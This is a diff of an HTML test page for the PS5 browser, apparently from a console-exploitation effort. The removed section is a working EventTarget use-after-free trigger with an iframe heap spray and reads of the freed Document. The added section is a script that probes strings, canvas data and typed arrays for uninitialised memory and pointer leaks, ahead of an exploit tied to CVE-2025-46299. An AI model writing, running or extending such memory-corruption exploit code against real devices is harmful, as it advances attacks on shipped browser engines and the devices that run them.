@@ -2,67 +2,100 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 EventTarget Info Leak (Iframe Reclaim)</title>
+<title>PS5 Uninitialized Memory Fuzzer</title>
 </head>
 <body>
-<button id="btn" style="font-size:24px; padding:20px;">Run UAF Test</button>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-document.getElementById('btn').onclick = () => {
-    L('[*] Starting EventTarget UAF Iframe Reclaim test...');
-    try {
-        const f = document.body.appendChild(document.createElement('iframe'));
-        const a = document.createElement('div');
-        const b = a.appendChild(document.createElement('div'));
+L('[*] Starting Uninitialized Memory Fuzzer...');
 
-        // Listener 1: Frees the Document and throws
-        a.addEventListener('a', eval(`(function () {
-            document.adoptNode(a);
-            f.remove();
-            // Throw a smaller error to avoid immediate SIGILL but still trigger the exception path
-            throw { sourceURL: 'A'.repeat(1024) };
-        })`));
-
-        // Listener 2: Buffer
-        a.addEventListener('a', () => {
-            L('[2] Buffer listener executed.');
-            // Spray iframes here to reclaim the freed Document slot
-            L('[2] Spraying 50 iframes to reclaim Document memory...');
-            for (var i = 0; i < 50; i++) {
-                var nf = document.createElement('iframe');
-                document.body.appendChild(nf);
+// --- Vector 1: Large String Operations ---
+// Some engines allocate a buffer for a string but forget to zero the end of it.
+L('\n--- Vector 1: String Operations ---');
+try {
+    let str = "A";
+    for (let i = 0; i < 20; i++) str += str; // 1MB string
+    
+    // Slice it rapidly to force new allocations
+    for (let i = 0; i < 100; i++) {
+        let slice = str.substring(0, 1024);
+        // Look for non-'A' characters in the slice
+        for (let j = 0; j < slice.length; j++) {
+            if (slice.charCodeAt(j) !== 65) {
+                L('[!] Found anomaly in string at index ' + j + ': ' + slice.charCodeAt(j).toString(16));
+                L('[!] Raw substring: ' + slice.substring(Math.max(0, j-4), j+4));
+                break;
             }
-        });
-
-        // Listener 3: Attempts to read properties
-        a.addEventListener('a', function() {
-            L('[3] Attempting to read f.contentDocument...');
-            let doc = f.contentDocument;
-            if (!doc) {
-                L('[3] f.contentDocument is null. Reference cleared.');
-                return;
-            }
-            
-            L('[3] Got an object! Attempting reads...');
-            try { L('  nodeType: ' + doc.nodeType); } catch(e) { L('  nodeType ERR: ' + e); }
-            try { L('  childNodes.length: ' + doc.childNodes.length); } catch(e) { L('  childNodes.length ERR: ' + e); }
-            try { L('  URL: ' + doc.URL); } catch(e) { L('  URL ERR: ' + e); }
-            try { L('  readyState: ' + doc.readyState); } catch(e) { L('  readyState ERR: ' + e); }
-            try { L('  referrer: ' + doc.referrer); } catch(e) { L('  referrer ERR: ' + e); }
-            
-            L('[3] Reads finished. Check for corrupted values or pointers!');
-        });
-
-        L('[*] Dispatching event...');
-        b.dispatchEvent(new Event('a', { bubbles: true }));
-        L('[*] Dispatch returned.');
-
-    } catch (e) {
-        L('[!] Uncaught error: ' + e.message);
+        }
     }
-};
+    L('[*] String vector completed. No immediate anomalies.');
+} catch(e) {
+    L('[!] String vector error: ' + e);
+}
+
+// --- Vector 2: Canvas2D ImageData ---
+// Some engines fail to initialize the pixel buffer before reading it back.
+L('\n--- Vector 2: Canvas2D ImageData ---');
+try {
+    let canvas = document.createElement('canvas');
+    canvas.width = 64;
+    canvas.height = 64;
+    let ctx = canvas.getContext('2d');
+    
+    // Create ImageData without drawing anything to the canvas
+    let imageData = ctx.createImageData(64, 64);
+    let data = imageData.data;
+    
+    // Look for non-zero pixels (uninitialized memory)
+    let found = false;
+    for (let i = 0; i < data.length; i += 4) {
+        // Check if pixel is not fully transparent black (0,0,0,0)
+        if (data[i] !== 0 || data[i+1] !== 0 || data[i+2] !== 0 || data[i+3] !== 0) {
+            L('[!] Found non-zero pixel at index ' + i + ': RGBA(' + data[i] + ',' + data[i+1] + ',' + data[i+2] + ',' + data[i+3] + ')');
+            found = true;
+            break;
+        }
+    }
+    if (!found) L('[*] Canvas vector completed. Canvas is zeroed.');
+} catch(e) {
+    L('[!] Canvas vector error: ' + e);
+}
+
+// --- Vector 3: TypedArray Allocation ---
+// Some engines allocate TypedArrays without zeroing the backing memory.
+L('\n--- Vector 3: TypedArray Allocation ---');
+try {
+    // Allocate and discard several arrays to churn the heap
+    for (let i = 0; i < 100; i++) {
+        new ArrayBuffer(1024);
+        new Float64Array(128);
+    }
+    
+    // Allocate a new array and check if it's zeroed
+    let arr = new Uint32Array(256);
+    let found = false;
+    for (let i = 0; i < arr.length; i++) {
+        if (arr[i] !== 0) {
+            // Large numbers that look like pointers are usually > 0x100000
+            if (arr[i] > 0x100000) {
+                L('[!] Found potential pointer leak in Uint32Array at index ' + i + ': 0x' + arr[i].toString(16));
+                found = true;
+                // Print surrounding values
+                for (let j = Math.max(0, i-2); j < Math.min(arr.length, i+3); j++) {
+                    L('    arr[' + j + '] = 0x' + arr[j].toString(16));
+                }
+                break;
+            }
+        }
+    }
+    if (!found) L('[*] TypedArray vector completed. Arrays are zeroed.');
+} catch(e) {
+    L('[!] TypedArray vector error: ' + e);
+}
+
+L('\n[*] Fuzzer finished. If nothing was found, we need the exact CVE-2025-46299 patch.');
 </script>
 </body>
 </html>
